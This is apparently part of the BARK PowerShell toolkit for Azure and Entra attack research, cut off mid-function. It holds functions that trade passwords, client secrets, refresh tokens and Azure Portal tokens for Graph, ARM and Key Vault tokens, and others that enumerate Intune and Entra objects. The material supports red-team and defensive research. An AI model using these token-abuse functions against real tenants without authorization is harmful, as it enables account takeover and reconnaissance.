# BloodHound Attack Research Kit (BARK)
# Author: Andy Robbins (@_wald0)
# License: GPLv3
# Threaded functions require PowerShell 7+

## ############################################ ##
## Token acquisition and manipulation functions ##
## ############################################ ##

Function Parse-JWTToken {
    <#
    .DESCRIPTION
    Decodes a JWT token.

    Author: Vasil Michev
    .LINK
    https://www.michev.info/Blog/Post/2140/decode-jwt-access-and-id-tokens-via-powershell
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]$Token
    )

    #Validate as per https://tools.ietf.org/html/rfc7519
    #Access and ID tokens are fine, Refresh tokens will not work
    if (-not $Token.Contains(".") -or -not $Token.StartsWith("eyJ")) {
        Write-Error "Invalid token" -ErrorAction Stop
    }
 
    #Header
    $tokenheader = $Token.Split(".")[0].Replace('-', '+').Replace('_', '/')

    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenheader.Length % 4) {
        Write-Verbose "Invalid length for a Base-64 char array or string, adding ="
        $tokenheader += "="
    }

    Write-Verbose "Base64 encoded (padded) header: $tokenheader"

    #Convert from Base64 encoded string to PSObject all at once
    Write-Verbose "Decoded header:"
    $header = ([System.Text.Encoding]::ASCII.GetString([system.convert]::FromBase64String($tokenheader)) | convertfrom-json)
 
    #Payload
    $tokenPayload = $Token.Split(".")[1].Replace('-', '+').Replace('_', '/')

    #Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) {
        Write-Verbose "Invalid length for a Base-64 char array or string, adding ="
        $tokenPayload += "="
    }
    
    Write-Verbose "Base64 encoded (padded) payoad: $tokenPayload"

    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)


    $tokenArray = ([System.Text.Encoding]::ASCII.GetString($tokenByteArray) | ConvertFrom-Json)

    #Converts $header and $tokenArray from PSCustomObject to Hashtable so they can be added together.
    #I would like to use -AsHashTable in convertfrom-json. This works in pwsh 6 but for some reason Appveyor isnt running tests in pwsh 6.
    $headerAsHash = @{}
    $tokenArrayAsHash = @{}
    $header.psobject.properties | ForEach-Object { $headerAsHash[$_.Name] = $_.Value }
    $tokenArray.psobject.properties | ForEach-Object { $tokenArrayAsHash[$_.Name] = $_.Value }
    $output = $headerAsHash + $tokenArrayAsHash

    Write-Output $output
}
New-Variable -Name 'Parse-JWTTokenDefinition' -Value (Get-Command -Name "Parse-JWTToken") -Force
New-Variable -Name 'Parse-JWTTokenAst' -Value (${Parse-JWTTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-EntraRefreshTokenWithUsernamePassword {
    <#
    .SYNOPSIS
        Requests a JWT and refresh token from STS. This will not correctly handle conditional access prompts. Returns
        the raw output from the API.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Requests a JWT and refresh token from STS. This will not correctly handle conditional access prompts.

    .PARAMETER Username
        A UPN-formatted Entra username.

    .PARAMETER Password
        The clear-text password of the Entra user.

    .EXAMPLE
        $RefreshToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0"

        Description
        -----------
        Attempt to retrieve a refresh token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0

        
    .EXAMPLE
        $RefreshToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0" `
            -ClientID "5c89cae2-2488-4e79-81d5-d9921b1437f1"

        Description
        -----------
        Attempt to retrieve a refresh token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0,
        but specifying a client ID of "5c89cae2-2488-4e79-81d5-d9921b1437f1" instead.

    .LINK
        https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth-ropc
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [string]
        $ClientID ="1b730954-1685-4b74-9bfd-dac224a7b894",

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "openid offline_access"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-EntraRefreshTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-EntraRefreshTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-EntraRefreshTokenWithUsernamePasswordAst' -Value (${Get-EntraRefreshTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithUsernamePassword {
    <#
    .SYNOPSIS
        Requests an MS Graph JWT from STS. This will not correctly handle conditional access prompts.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Requests an MS Graph JWT from STS. This will not correctly handle conditional access prompts.

    .PARAMETER Username
        A UPN-formatted Entra username.

    .PARAMETER Password
        The clear-text password of the Entra user.

    .EXAMPLE
        $MSGraphToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0"

        Description
        -----------
        Attempt to retrieve an MS Graph token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0

        
    .EXAMPLE
        $RefreshToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0" `
            -ClientID "5c89cae2-2488-4e79-81d5-d9921b1437f1"

        Description
        -----------
        Attempt to retrieve an MS Graph token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0,
        but specifying a client ID of "5c89cae2-2488-4e79-81d5-d9921b1437f1" instead.

    .LINK
        https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth-ropc
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [string]
        $ClientID ="1b730954-1685-4b74-9bfd-dac224a7b894",

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://graph.microsoft.com/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-MSGraphTokenWithUsernamePasswordAst' -Value (${Get-MSGraphTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMTokenWithUsernamePassword {
    <#
    .SYNOPSIS
        Requests an Azure Resource Manager JWT from STS. This will not correctly handle conditional access prompts.

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Requests an Azure Resource Manager JWT from STS. This will not correctly handle conditional access prompts.

    .PARAMETER Username
        A UPN-formatted Entra username.

    .PARAMETER Password
        The clear-text password of the Entra user.

    .EXAMPLE
        $AzureRMToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0"

        Description
        -----------
        Attempt to retrieve an Azure RM token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0

        
    .EXAMPLE
        $AzureRMToken = Get-EntraRefreshTokenWithUsernamePassword `
            -Username myuser@contoso.onmicrosoft.com `
            -Password MyClearT3xtPassw0rd `
            -TenantID "197394d9-7065-43d2-8dc8-c63c1349abb0" `
            -ClientID "5c89cae2-2488-4e79-81d5-d9921b1437f1"

        Description
        -----------
        Attempt to retrieve an Azure RM token for the myuser@contoso.onmicrosoft.com user, specifying the tenant ID of 197394d9-7065-43d2-8dc8-c63c1349abb0,
        but specifying a client ID of "5c89cae2-2488-4e79-81d5-d9921b1437f1" instead.

    .LINK
        https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth-ropc
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [string]
        $ClientID ="1b730954-1685-4b74-9bfd-dac224a7b894",

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://management.azure.com/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureRMTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-AzureRMTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-AzureRMTokenWithUsernamePasswordAst' -Value (${Get-AzureRMTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithClientCredentials {
    <#
    .SYNOPSIS
        Uses client credentials to request a token from STS with the MS Graph specified as the resource/intended audience

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Uses client credentials to request a token from STS with the MS Graph specified as the resource/intended audience

    .PARAMETER ClientID
        The service principal or app registration's client ID

    .PARAMETER ClientSecret
        The clear-text secret of the Entra service principal.

    .PARAMETER TenantName
        The display name of the Entra tenant to authenticate to.

    .PARAMETER UseCAE
        Whether to supply the continuous access evaluation payload in the authentication request.

    .EXAMPLE
        $MSGraphToken = Get-MSGraphTokenWithClientCredentials `
            -ClientID "47ee07e9-6ea7-43b3-bbdf-2d64d427e9bb" `
            -ClientSecret asdf... `
            -TenantName contoso.onmicrosoft.com

        Description
        -----------
        Attempt to retrieve an MS Graph token for the service principal located in the specified tenant and associated with the specified client ID

    .LINK
        https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://graph.microsoft.com/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithClientCredentials") -Force
New-Variable -Name 'Get-MSGraphTokenWithClientCredentialsAst' -Value (${Get-MSGraphTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithRefreshToken {
    <#
    .SYNOPSIS
        Supplies a refresh token to STS, requesting a token with MS Graph specified as the resource/intended resource

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Supplies a refresh token to STS, requesting a token with MS Graph specified as the resource/intended resource

    .PARAMETER RefreshToken
        The Entra refresh token

    .PARAMETER TenantID
        The GUID of the Entra tenant to authenticate to.

    .PARAMETER UseCAE
        Whether to supply the continuous access evaluation payload in the authentication request.

    .EXAMPLE
        $MSGraphToken = Get-MSGraphTokenWithRefreshToken `
            -RefreshToken $MyRefreshToken `
            -TenantID "38e20407-7f80-47ab-a7d0-804f55b4e5b5"

        Description
        -----------
        Attempt to retrieve an MS Graph token using the specified refresh token

    .LINK
        https://learn.microsoft.com/en-us/entra/identity-platform/refresh-tokens
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "https://graph.microsoft.com"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI        "https://login.microsoftonline.com/$TenantId/oauth2/token?api-version=1.0" `
        -Method     "POST" `
        -Body       $Body

    $Token
}
New-Variable -Name 'Get-MSGraphTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithRefreshToken") -Force
New-Variable -Name 'Get-MSGraphTokenWithRefreshTokenAst' -Value (${Get-MSGraphTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-MSGraphTokenWithPortalAuthRefreshToken {
    <#
    .DESCRIPTION
    Supplies a Portal Auth Refresh Token to the Azure Portal DelegationToken endpoint and requests an MS Graph-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $PortalAuthRefreshToken,

        [Parameter(Mandatory = $False)]
        [string]
        $AltPortalAuthRefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $True)]
        [string]
        $PortalID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        extensionName = "Microsoft_AAD_UsersAndTenants"
        resourceName = "microsoft.graph"
        tenant = $TenantID
        portalAuthorization = $PortalAuthRefreshToken
        altPortalAuthorization = $AltPortalAuthRefreshToken
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $WebSession.Cookies.Add((New-Object System.Net.Cookie("portalId", ($PortalID), "/", ".portal.azure.com")))

    $TokenRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://portal.azure.com/api/DelegationToken?feature.cacheextensionapp=false&feature.internalgraphapiversion=true&feature.tokencaching=false" `
        -Method "POST" `
        -WebSession $WebSession `
        -ContentType "application/json" `
        -Body $($body | ConvertTo-Json) 
    $GraphJWT = (($TokenRequest.Content | ConvertFrom-JSON).value).authHeader

    $GraphJWT
}
New-Variable -Name 'Get-MSGraphTokenWithPortalAuthRefreshTokenDefinition' -Value (Get-Command -Name "Get-MSGraphTokenWithPortalAuthRefreshToken") -Force
New-Variable -Name 'Get-MSGraphTokenWithPortalAuthRefreshTokenAst' -Value (${Get-MSGraphTokenWithPortalAuthRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMTokenWithPortalAuthRefreshToken {
    <#
    .DESCRIPTION
    Supplies a Portal Auth Refresh Token to the Azure Portal DelegationToken endpoint and requests an AzureRM-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $PortalAuthRefreshToken,

        [Parameter(Mandatory = $False)]
        [string]
        $AltPortalAuthRefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        extensionName = "Microsoft_Azure_PIMCommon"
        resourceName = ""
        tenant = $TenantID
        portalAuthorization = $PortalAuthRefreshToken
        altPortalAuthorization = $AltPortalAuthRefreshToken
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $WebSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $WebSession.Cookies.Add((New-Object System.Net.Cookie("portalId", ($PortalID), "/", ".portal.azure.com")))

    $TokenRequest = Invoke-WebRequest `
        -UseBasicParsing `
        -Uri "https://portal.azure.com/api/DelegationToken?feature.cacheextensionapp=false&feature.internalgraphapiversion=true&feature.tokencaching=false" `
        -Method "POST" `
        -WebSession $WebSession `
        -ContentType "application/json" `
        -Body $($body | ConvertTo-Json) 
    $ARMJWT = (($TokenRequest.Content | ConvertFrom-JSON).value).authHeader

    $ARMJWT
}
New-Variable -Name 'Get-AzureRMTokenWithPortalAuthRefreshTokenDefinition' -Value (Get-Command -Name "Get-AzureRMTokenWithPortalAuthRefreshToken") -Force
New-Variable -Name 'Get-AzureRMTokenWithPortalAuthRefreshTokenAst' -Value (${Get-AzureRMTokenWithPortalAuthRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMTokenWithClientCredentials {
    <#
    .DESCRIPTION
    Uses client credentials to request a token from STS with Azure Resource Manager specified as the resource/intended audience
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://management.azure.com/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureRMTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-AzureRMTokenWithClientCredentials") -Force
New-Variable -Name 'Get-AzureRMTokenWithClientCredentialsAst' -Value (${Get-AzureRMTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureRMTokenWithRefreshToken {
    <#
    .DESCRIPTION
    Supplies a refresh token to the STS, requesting an AzureRM-scoped JWT

    Based on RefreshTo-AzureCoreManagementToken by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "https://management.core.windows.net"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/token?api-version=1.0" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureRMTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-AzureRMTokenWithRefreshToken") -Force
New-Variable -Name 'Get-AzureRMTokenWithRefreshTokenAst' -Value (${Get-AzureRMTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzurePortalTokenWithRefreshToken {
    <#
    .DESCRIPTION
    Supplies a refresh token to the STS, requesting an Azure Portal-scoped JWT

    Based on Token Tactics by Steve Borosh (@424f424f) - https://github.com/rvrsh3ll/TokenTactics
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $RefreshToken,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        "grant_type"    =   "refresh_token"
        "refresh_token" =   $RefreshToken
        "scope"         =   "openid"
        "resource"      =   "74658136-14ec-4630-ad9b-26e160ff0fc6"
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.windows.net/$TenantId/oauth2/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzurePortalTokenWithRefreshTokenDefinition' -Value (Get-Command -Name "Get-AzurePortalTokenWithRefreshToken") -Force
New-Variable -Name 'Get-AzurePortalTokenWithRefreshTokenAst' -Value (${Get-AzurePortalTokenWithRefreshTokenDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureKeyVaultTokenWithClientCredentials {
    <#
    .DESCRIPTION
    Uses client credentials to request a token from STS with Azure Vault specified as the resource/intended audience
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $ClientID,

        [Parameter(Mandatory = $True)]
        [string]
        $ClientSecret,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantName,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $Body = @{
        Grant_Type      =   "client_credentials"
        Scope           =   "https://vault.azure.net/.default"
        client_Id       =   $ClientID
        Client_Secret   =   $ClientSecret
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantName/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureKeyVaultTokenWithClientCredentialsDefinition' -Value (Get-Command -Name "Get-AzureKeyVaultTokenWithClientCredentials") -Force
New-Variable -Name 'Get-AzureKeyVaultTokenWithClientCredentialsAst' -Value (${Get-AzureKeyVaultTokenWithClientCredentialsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-AzureKeyVaultTokenWithUsernamePassword {
    <#
    .DESCRIPTION
    Requests an Azure Key Vault-scoped JWT from STS. This will fail if your user has MFA requiremnts.
    #>
    [cmdletbinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $Username,

        [Parameter(Mandatory = $True)]
        [string]
        $Password,

        [Parameter(Mandatory = $True)]
        [string]
        $TenantID,

        [Parameter(Mandatory = $False)]
        [Switch]
        $UseCAE
    )

    $ClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

    $Body = @{
        Grant_Type    =   "password"
        Scope         =   "https://vault.azure.net/.default"
        Username      =   $Username
        Password      =   $Password
        Client_ID     =   $ClientID
        
    }

    if ($UseCAE) {
        $Claims = (
            @{
                "access_token" = @{
                    "xms_cc" = @{
                        "values" = @(
                            "cp1"
                        )
                    }
                }
            } | ConvertTo-Json -Compress -Depth 3 )
        $Body.Add("claims", $Claims)
    }

    $Token = Invoke-RestMethod `
        -URI    "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
        -Method POST `
        -Body   $Body

    $Token
}
New-Variable -Name 'Get-AzureKeyVaultTokenWithUsernamePasswordDefinition' -Value (Get-Command -Name "Get-AzureKeyVaultTokenWithUsernamePassword") -Force
New-Variable -Name 'Get-AzureKeyVaultTokenWithUsernamePasswordAst' -Value (${Get-AzureKeyVaultTokenWithUsernamePasswordDefinition}.ScriptBlock.Ast.Body) -Force

##################################
## Intune Enumeration functions ##
##################################

Function Get-IntuneRoleDefinitions {
    <#
    .SYNOPSIS
        Retrieves the available Intune role definitions

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Retrieves the available Intune role definitions

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to list Intune role definitions

    .EXAMPLE
        C:\PS> $IntuneRoleDefinitions = Get-IntuneRoleDefinitions `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to list the available Intune role definitions

    .LINK
        https://learn.microsoft.com/en-us/graph/api/intune-rbac-roledefinition-list?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Using the provided token, get the current list of available Intune definitions
    $IntuneRoleDefinitions = $null
    $URI = 'https://graph.microsoft.com/beta/deviceManagement/roleDefinitions'
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $IntuneRoleDefinitions += $Results.value
        } else {
            $IntuneRoleDefinitions += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $IntuneRoleDefinitions
}
New-Variable -Name 'Get-IntuneRoleDefinitionsDefinition' -Value (Get-Command -Name "Get-IntuneRoleDefinitions") -Force
New-Variable -Name 'Get-IntuneRoleDefinitionsAst' -Value (${Get-IntuneRoleDefinitionsDefinition}.ScriptBlock.Ast.Body) -Force

Function Get-IntuneManagedDevices {
    <#
    .SYNOPSIS
        Retrieves Intune-managed device objects

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Retrieves Intune-managed device objects

    .PARAMETER Token
        The MS Graph-scoped JWT for the principal with the ability to list Intune devices

    .EXAMPLE
        C:\PS> $IntuneManagedDevices = Get-IntuneManagedDevices `
            -Token $Token

        Description
        -----------
        Uses the token from $Token to list Intune-managed devices

    .LINK
        https://learn.microsoft.com/en-us/graph/api/intune-devices-manageddevice-list?view=graph-rest-1.0
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $Token
    )

    # Using the provided token, list all Intune managed devices
    $URI = 'https://graph.microsoft.com/beta/deviceManagement/managedDevices'
    do {
        $Results = Invoke-RestMethod `
            -Headers @{
                Authorization = "Bearer $($Token)"
            } `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $IntuneManagedDevices += $Results.value
        } else {
            $IntuneManagedDevices += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    $IntuneManagedDevices

}

## ########################### ##
## Entra Enumeration Functions ##
## ########################### ##

Function Get-EntraDeviceRegisteredUsers {
    <#
    .SYNOPSIS
        Get the JSON-formatted user(s) of a specified Entra device using the MS Graph API
    
        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None
    
    .DESCRIPTION
        Get the JSON-formatted user(s) of a specified Entra device using the MS Graph API
    
    .PARAMETER Token
        The MS Graph-scoped JWT for the princpal with read access to Entra device users
    
    .EXAMPLE
    C:\PS> $EntraDeviceRegisteredUsers = Get-EntraDeviceRegisteredUsers `
               -Token $Token -DeviceID "25d185cb-cadd-45be-a048-e1424dd9e32b"
    
    Description
    -----------
    Uses the JWT in the $Token variable to list the user(s) of the Entra device with ID of
    "25d185cb-cadd-45be-a048-e1424dd9e32b" and put it into the $EntraDeviceUsers variable
    
    .LINK
        https://learn.microsoft.com/en-us/graph/api/device-list-registeredusers?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
